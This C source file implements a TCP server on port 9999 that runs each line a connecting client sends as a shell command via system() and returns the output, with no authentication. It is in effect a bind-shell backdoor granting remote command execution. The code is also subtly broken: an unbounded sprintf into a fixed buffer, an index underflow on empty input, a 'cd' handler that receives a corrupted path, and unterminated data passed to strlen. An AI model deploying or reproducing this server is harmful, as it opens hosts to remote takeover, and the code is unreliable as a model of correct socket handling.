#include <stdio.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define FAIL (-1)
typedef struct sockaddr_in SOCKADDR_IN;
typedef struct sockaddr SOCKADDR;

int sendData(int sfd, char *buffer) {
    int count = 0, bytes;
    do {
        bytes = (int) send(sfd, buffer + count, strlen(buffer) - count, 0);
        count += bytes;
    } while (bytes >= 0 && count < strlen(buffer));
    return count;
}

int main() {
    int sfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    SOCKADDR_IN saddr, caddr;
    int clen = sizeof(caddr);

    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(9999);
    saddr.sin_addr.s_addr = INADDR_ANY;

    int error = bind(sfd, (SOCKADDR *) &saddr, sizeof saddr);
    if (error == -1)
        abort();

    listen(sfd, 10);

    int cfd = accept(sfd, (SOCKADDR *) &caddr, (unsigned int *) &clen);
    if (cfd != FAIL) {
        char *welcome = "Welcome to TCP server\nType a command\n";
        send(cfd, welcome, strlen(welcome), 0);

        while (1) {
            char buffer[1024] = {0};
            recv(cfd, buffer, sizeof buffer, 0);
            if (buffer[strlen(buffer) - 1] == '\n')
                buffer[strlen(buffer) - 1] = 0;
            sprintf(buffer + strlen(buffer), " > out.txt");
            system(buffer);

            if (strncmp(buffer, "cd", 2) == 0) {
                char *result = "Directory Changed\n";
                chdir(buffer + 3);
                sendData(cfd, result);
                continue;
            }

            FILE *f = fopen("out.txt", "r");
            if (f != NULL) {
                fseek(f, 0, SEEK_END);
                int fsize = (int) ftell(f);
                fseek(f, 0, SEEK_SET);
                char *data = (char *) calloc(fsize, 1);
                fread(data, 1, fsize, f);
                fclose(f);
                sendData(cfd, data);
                free(data);
                data = NULL;
            } else {
                char *result = "Permission Denied\nCannot create out.txt in the current folder\n";
                sendData(cfd, result);
            }

            if (strncmp(buffer, "exit", 4) == 0)
                break;
        }
        close(cfd);
    }
    close(sfd);
}
